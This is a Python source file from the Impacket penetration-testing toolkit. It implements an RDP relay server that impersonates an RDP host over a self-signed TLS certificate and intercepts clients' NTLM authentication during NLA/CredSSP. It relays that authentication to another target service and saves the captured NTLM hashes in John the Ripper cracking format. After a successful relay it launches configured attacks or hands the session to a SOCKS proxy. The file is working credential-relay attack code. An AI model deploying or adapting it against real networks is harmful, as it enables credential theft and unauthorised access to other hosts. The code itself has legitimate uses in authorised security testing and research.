# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   RDP Relay Server
#
#   This is the RDP server which relays the NTLMSSP messages to other protocols.
#
# Author:
#  Giovanni A. (@azoxlpf)²

from __future__ import division
from __future__ import print_function

import select
import socket
import struct
import time
from threading import Thread

from OpenSSL import SSL

from impacket import ntlm, LOG
from impacket.nt_errors import STATUS_SUCCESS
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.structure import Structure
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.ntlmrelayx.utils.rdp_ssl import ServerTLSContext, generate_self_signed_cert


class RDPRelayServer(Thread):

    # TPKT/X.224 constants
    TPKT_VERSION = 3
    TPDU_CONNECTION_REQUEST = 0xe0
    TPDU_CONNECTION_CONFIRM = 0xd0
    TPDU_DATA = 0xf0

    # RDP_NEG constants
    TYPE_RDP_NEG_REQ = 1
    TYPE_RDP_NEG_RSP = 2
    PROTOCOL_RDP = 0
    PROTOCOL_SSL = 1
    PROTOCOL_HYBRID = 2

    class TPKT(Structure):
        commonHdr = (
            ('Version', 'B=3'),
            ('Reserved', 'B=0'),
            ('Length', '>H'),
            ('_TPDU', '_-TPDU', 'self["Length"]-4'),
            ('TPDU', ':=""'),
        )

    class TPDU(Structure):
        commonHdr = (
            ('LengthIndicator', 'B'),
            ('Code', 'B'),
            ('VariablePart', ':=""'),
        )

        def __init__(self, data=None):
            Structure.__init__(self, data)
            if data is None:
                self['VariablePart'] = ''

    class CR_TPDU(Structure):
        commonHdr = (
            ('DST-REF', '<H=0'),
            ('SRC-REF', '<H=0'),
            ('CLASS-OPTION', 'B=0'),
            ('Type', 'B=0'),
            ('Flags', 'B=0'),
            ('Length', '<H=8'),
        )

    class RDP_NEG_REQ(CR_TPDU):
        structure = (('requestedProtocols', '<L'),)

    class RDP_NEG_RSP(CR_TPDU):
        structure = (('selectedProtocols', '<L'),)

    class RDPServer(socket.socket):
        def __init__(self, config):
            self.config = config
            socket.socket.__init__(self, socket.AF_INET, socket.SOCK_STREAM)
            self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if config.ipv6:
                self.address_family = socket.AF_INET6

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.targetprocessor = self.config.target
        self.target = None
        self.authUser = None

        rdp_port = self.config.listeningPort if self.config.listeningPort else 3389

        self.server = self.RDPServer(self.config)
        self.server.bind((config.interfaceIp, rdp_port))
        self.server.listen(5)
        LOG.info("Setting up RDP Server on port %s" % rdp_port)

    def run(self):
        LOG.info("RDP Relay Server started on %s:%s" % (self.config.interfaceIp, self.server.getsockname()[1]))
        while True:
            try:
                client_socket, client_address = self.server.accept()
                client_thread = Thread(target=self.handle_client, args=(client_socket, client_address))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                LOG.error("(RDP): Exception in server loop: %s" % str(e))
                break

    @staticmethod
    def find_ntlmssp_in_data(data):
        return data.find(b"NTLMSSP\x00")

    def handle_client(self, client_socket, client_address):
        try:
            LOG.info("(RDP): New connection from %s:%s" % (client_address[0], client_address[1]))
            client_socket.settimeout(30)

            # Receive initial connection request
            data = client_socket.recv(4096)
            if len(data) < 4:
                return

            try:
                tpkt = self.TPKT(data)
                if tpkt['Version'] != self.TPKT_VERSION:
                    return
                tpdu = self.TPDU(tpkt['TPDU'])
                if tpdu['Code'] != self.TPDU_CONNECTION_REQUEST:
                    return
            except Exception:
                return

            cr_tpdu = self.CR_TPDU(tpdu['VariablePart'])
            if cr_tpdu['Type'] != self.TYPE_RDP_NEG_REQ:
                return

            rdp_neg = self.RDP_NEG_REQ(tpdu['VariablePart'])
            if not (rdp_neg['requestedProtocols'] & self.PROTOCOL_HYBRID):
                LOG.warning("(RDP): Client doesn't support PROTOCOL_HYBRID (NLA)")
                return

            response = self.build_rdp_neg_response(self.PROTOCOL_HYBRID)
            client_socket.sendall(response)
            time.sleep(0.1)

            self.handle_credssp(client_socket, client_address)

        except socket.timeout:
            pass
        except Exception as e:
            LOG.error("(RDP): Exception in handle_client: %s" % str(e))
        finally:
            try:
                client_socket.close()
            except Exception:
                pass

    def handle_credssp(self, client_socket, client_address):
        client_tls = None
        relay_client = None

        try:
            # Generate self-signed certificate for TLS
            priv_key_path, cert_path = generate_self_signed_cert("RDP-Server")
            server_ctx = ServerTLSContext(priv_key_path, cert_path)
            client_tls_ctx = server_ctx.getContext()

            # Establish TLS with client
            client_tls = SSL.Connection(client_tls_ctx, client_socket)
            client_tls.set_accept_state()

            # Complete TLS handshake
            handshake_complete = False
            handshake_timeout = 300  # 5 minutes max for user to enter credentials
            start_time = time.time()

            while not handshake_complete and (time.time() - start_time) < handshake_timeout:
                try:
                    client_socket.settimeout(5)
                    client_tls.do_handshake()
                    handshake_complete = True
                    LOG.info("(RDP): TLS established with client")
                except SSL.WantReadError:
                    ready = select.select([client_socket], [], [], 5)
                    if not ready[0]:
                        continue
                except SSL.WantWriteError:
                    continue
                except SSL.Error:
                    break
                except socket.timeout:
                    continue

            if not handshake_complete:
                LOG.warning("(RDP): TLS handshake failed")
                return


            client_socket.settimeout(300)
            challenge = None
            negotiate_message = None

            while True:
                try:
                    data = client_tls.recv(4096)
                except SSL.WantReadError:
                    ready = select.select([client_socket], [], [], 30)
                    if ready[0]:
                        continue
                    break
                except (SSL.SysCallError, SSL.Error):
                    break

                if not data:
                    break

                ntlm_offset = self.find_ntlmssp_in_data(data)
                if ntlm_offset == -1:
                    continue

                ntlm_token = data[ntlm_offset:]
                if len(ntlm_token) < 12:
                    continue

                message_type = struct.unpack('<L', ntlm_token[8:12])[0]

                if message_type == 1:  # NEGOTIATE
                    negotiate_message = ntlm.NTLMAuthNegotiate()
                    negotiate_message.fromString(ntlm_token)
                    LOG.info("(RDP): Received NTLMSSP NEGOTIATE from %s" % client_address[0])

                    self.target = self.targetprocessor.getTarget(multiRelay=False)
                    if self.target is None:
                        if self.config.keepRelaying:
                            self.targetprocessor.reloadTargets(full_reload=True)
                            self.target = self.targetprocessor.getTarget(multiRelay=False)
                        if self.target is None:
                            LOG.info("(RDP): Connection from %s controlled, but there are no more targets left!" % client_address[0])
                            break

                    LOG.info("(RDP): Relaying to %s://%s" % (self.target.scheme, self.target.netloc))

                    if self.target.scheme.upper() not in self.config.protocolClients:
                        LOG.error("(RDP): No protocol client for %s" % self.target.scheme.upper())
                        break

                    relay_client = self.config.protocolClients[self.target.scheme.upper()](
                        self.config, self.target, extendedSecurity=True
                    )
                    if not relay_client.initConnection():
                        LOG.error("(RDP): Could not connect to target %s" % self.target.netloc)
                        break

                    challenge_message = relay_client.sendNegotiate(negotiate_message.getData())
                    if challenge_message is False or challenge_message is None:
                        LOG.error("(RDP): Failed to get challenge from target")
                        break

                    challenge = challenge_message['challenge']
                    LOG.info("(RDP): Got CHALLENGE from target %s" % self.target.netloc)

                    # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
                    if self.config.remove_target:
                        av_pairs = ntlm.AV_PAIRS(challenge_message['TargetInfoFields'])
                        del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
                        challenge_message['TargetInfoFields'] = av_pairs.getData()
                        challenge_message['TargetInfoFields_len'] = len(av_pairs.getData())
                        challenge_message['TargetInfoFields_max_len'] = len(av_pairs.getData())


                    challenge_response = self.build_tsrequest_challenge(challenge_message.getData())
                    client_tls.sendall(challenge_response)

                elif message_type == 3:  # AUTHENTICATE
                    authenticate_message = ntlm.NTLMAuthChallengeResponse()
                    authenticate_message.fromString(ntlm_token)
                    self.authUser = authenticate_message.getUserString()

                    LOG.info("(RDP): Received NTLMSSP AUTHENTICATE from %s@%s" % (self.authUser, client_address[0]))


                    if challenge and self.config.outputFile:
                        ntlm_hash_data = outputToJohnFormat(
                            challenge,
                            authenticate_message['user_name'],
                            authenticate_message['domain_name'],
                            authenticate_message['lanman'],
                            authenticate_message['ntlm']
                        )
                        writeJohnOutputToFile(
                            ntlm_hash_data['hash_string'],
                            ntlm_hash_data['hash_version'],
                            self.config.outputFile
                        )

                    # Relay AUTHENTICATE to target
                    if relay_client:
                        clientResponse, errorCode = relay_client.sendAuth(authenticate_message.getData())

                        if errorCode == STATUS_SUCCESS:
                            relay_client.setClientId()
                            LOG.info("(RDP): Authenticating connection from %s@%s against %s://%s SUCCEED [%s]" % (
                                self.authUser, client_address[0], self.target.scheme, self.target.netloc, relay_client.client_id
                            ))
                            self.targetprocessor.registerTarget(self.target, True, self.authUser)

                            # Execute attack
                            self.do_attack(relay_client)
                        else:
                            LOG.error("(RDP): Authenticating against %s://%s as %s FAILED" % (
                                self.target.scheme, self.target.netloc, self.authUser
                            ))
                            self.targetprocessor.registerTarget(self.target, False, self.authUser)
                            relay_client.killConnection()
                    break

        except Exception as e:
            LOG.debug("(RDP): Exception in handle_credssp: %s" % str(e))
        finally:
            if client_tls:
                try:
                    client_tls.shutdown()
                except Exception:
                    pass

    def do_attack(self, client):
        # Check if SOCKS is enabled and if we support the target scheme
        if self.config.runSocks and self.target.scheme.upper() in self.config.socksServer.supportedSchemes:
            # Pass all the data to the socks proxy
            activeConnections.put((self.target.hostname, client.targetPort, self.target.scheme.upper(),
                                   self.authUser, client, client.sessionData))
            return

        # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        if self.target.scheme.upper() in self.config.attacks:
            clientThread = self.config.attacks[self.target.scheme.upper()](
                self.config, client.session, self.authUser, self.target, client
            )
            clientThread.start()
        else:
            LOG.error('(RDP): No attack configured for %s' % self.target.scheme.upper())

    def build_rdp_neg_response(self, protocol):
        rdp_neg = self.RDP_NEG_RSP()
        rdp_neg['Type'] = self.TYPE_RDP_NEG_RSP
        rdp_neg['selectedProtocols'] = protocol

        tpdu = self.TPDU()
        tpdu['LengthIndicator'] = len(rdp_neg.getData()) + 1
        tpdu['Code'] = self.TPDU_CONNECTION_CONFIRM
        tpdu['VariablePart'] = rdp_neg.getData()

        tpkt = self.TPKT()
        tpkt['Version'] = self.TPKT_VERSION
        tpkt['Length'] = len(tpdu.getData()) + 4
        tpkt['TPDU'] = tpdu.getData()

        return tpkt.getData()

    def build_tsrequest_challenge(self, challenge_data):
        def write_length(length):
            if length > 0x7f:
                return struct.pack('>BH', 0x82, length)
            return struct.pack('B', length)

        def write_universal_tag(tag, is_constructed):
            tag_byte = (0x00 if not is_constructed else 0x20) | (tag & 0x1f)
            return struct.pack('B', tag_byte)

        def write_contextual_tag(tag_num, size):
            tag_byte = 0xa0 | (tag_num & 0x1f)
            return struct.pack('B', tag_byte) + write_length(size)

        def write_integer(value):
            int_bytes = struct.pack('B', value)
            return struct.pack('B', 0x02) + write_length(len(int_bytes)) + int_bytes

        def write_octet_string(data):
            return struct.pack('B', 0x04) + write_length(len(data)) + data

        octet_string = write_octet_string(challenge_data)
        ctx0 = write_contextual_tag(0, len(octet_string)) + octet_string
        inner_seq = write_universal_tag(0x10, True) + write_length(len(ctx0)) + ctx0
        outer_seq = write_universal_tag(0x10, True) + write_length(len(inner_seq)) + inner_seq
        ctx1 = write_contextual_tag(1, len(outer_seq)) + outer_seq
        version_int = write_integer(5)
        ctx_version = write_contextual_tag(0, len(version_int)) + version_int
        main_content = ctx_version + ctx1
        ts_request = write_universal_tag(0x10, True) + write_length(len(main_content)) + main_content

        return ts_request